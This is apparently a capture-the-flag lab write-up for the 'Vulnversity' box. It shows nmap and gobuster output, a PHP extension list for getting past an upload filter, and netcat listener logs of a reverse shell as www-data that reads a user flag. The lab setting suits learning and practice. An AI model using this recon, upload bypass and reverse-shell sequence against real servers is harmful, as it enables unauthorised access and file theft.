# Vulnversity

## Reconnaissance

Scan the box, how many ports are open? 6

```
nmap -sV -n 10.10.123.163
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-17 13:21 CDT
Nmap scan report for 10.10.123.163
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.18 seconds
```

What version of the squid proxy is running on the machine?

3.5.12

How many ports will nmap scan if the flag -p-400 was used?

400

Using the nmap flag -n what will it not resolve?

DNS

What is the most likely operating system this machine is running?

Ubuntu

What port is the web server running on?

3333

## Locating directories using GoBuster

What is the directory that has an upload form page? http://10.10.123.163/internal/

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.123.163:3333
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.123.163:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/04/17 13:34:03 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 322] [--> http://10.10.123.163:3333/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.123.163:3333/css/]   
/js                   (Status: 301) [Size: 318] [--> http://10.10.123.163:3333/js/]    
/fonts                (Status: 301) [Size: 321] [--> http://10.10.123.163:3333/fonts/]
/internal             (Status: 301) [Size: 324] [--> http://10.10.123.163:3333/internal/]
```

### Compromise the server

Try upload a few file types to the server, what common extension seems to be blocked?

.php

```
nano phpext.txt

GNU nano 5.4                           
phpext.txt                                             
.php
.php3
.php4
.php5
.phtml

cat phpext.txt
.php
.php3
.php4
.php5
.phtml
```

Run this attack, what extension is allowed?


https://github.com/regtay/Vulnversity/blob/main/Images/Burpsuite%20View%20.png

https://github.com/regtay/Vulnversity/blob/main/Images/Rervereshell%20upload.png

https://github.com/regtay/Vulnversity/blob/main/Images/Upload%20.png



```
nc -lvnp 9001                                                                                   
listening on [any] 9001 ...
connect to [10.9.239.22] from (UNKNOWN) [10.10.123.163] 46740
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
16:31:25 up  1:56,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$

What is the name of the user who manages the webserver? bill

What is the user flag? 8bd7992fbe8a6a----------04cfcedb

```

```
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.9.239.22] from (UNKNOWN) [10.10.123.163] 46752
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 16:34:23 up  1:59,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls /home
bill
$ ls /home/bill
user.txt
$ cat /home/bill/user.txt
8bd7992fbe8a6a----------04cfcedb
$
```

#### Privilege Escalation

On the system, search for all SUID files. What file stands out?

systemctl
